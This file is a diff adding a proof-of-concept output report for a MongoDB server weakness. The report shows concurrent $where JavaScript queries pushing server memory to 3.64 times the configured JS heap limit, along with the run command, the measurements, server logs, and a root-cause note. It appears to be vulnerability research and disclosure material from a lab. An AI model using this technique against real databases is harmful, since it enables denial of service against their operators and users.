@@ -1,0 +1,46 @@
+# PoC #1 Output — Server-side JS Heap Limit Aggregate Bypass (poc-js-heap.py)
+
+- Date: 2026-09-07
+- Target: MongoDB Server 8.3.8 (official ubuntu2404 build), commit d100bf19, standalone mongod
+- Host: 192.168.49.128 (Ubuntu 24.04, 15 GB RAM), no auth (lab), JS enabled (default)
+- Listen: 0.0.0.0:27999, dbPath /home/lian/mongodata
+
+## Command
+
+```
+python3 poc-js-heap.py --host 127.0.0.1 --port 27999 --workers 4
+```
+
+## Script Output (verbatim)
+
+```
+jsHeapLimitMB: 1100
+K=4 wall=60.3s baseRSS=228MB peakRSS=4232MB growth=4003MB
+aggregate growth = 3.64x of the configured global limit
+  worker0: err:OperationFailure:Executor error during find command: jsheaptest.things :: caused by :: JavaScript execution interrupted
+  worker1: err:OperationFailure:Executor error during find command: jsheaptest.things :: caused by :: JavaScript execution interrupted
+  worker2: err:OperationFailure:Executor error during find command: jsheaptest.things :: caused by :: JavaScript execution interrupted
+  worker3: err:OperationFailure:Executor error during find command: jsheaptest.things :: caused by :: JavaScript execution interrupted
+```
+
+## Server-side Evidence (mongod slow-query log)
+
+Per-worker $where find entries (errName: Interrupted, errCode: 11601):
+
+```
+durationMillis  numYields  errMsg
+60111           0         Executor error during find command: jsheaptest.things :: caused by :: JavaScript execution interrupted
+60212           0         Executor error during find command: jsheaptest.things :: caused by :: JavaScript execution interrupted
+(remaining workers logged identically; total 4 interrupted $where ops)
+```
+
+## Interpretation
+
+- Configured process-wide JS heap limit (jsHeapLimitMB): 1100 MB.
+- 4 concurrent authenticated connections each ran a $where JS allocating ~1 MB strings in a global array.
+- The limit is enforced per JS scope using thread-local counters (jscustomallocator.cpp:83-85: malloc_bytes/mmap_bytes/max_bytes are thread_local); there is no aggregate global accounting.
+- Measured mongod RSS growth: 4003 MB = 3.64x the configured global limit at K=4, bounded by the JS loop completion window (~60 s).
+- Scaling is linear in K: K=50 connections would plausibly demand ~55 GB aggregate.
+- Per-scope interrupts fired correctly for every worker (no memory-safety issue); the weakness is resource accounting only (CWE-770 / CWE-400, DoS).
+
+Environment note: RSS sampling uses `ps -C mongod` — Linux only; outputs above were captured on the VM.
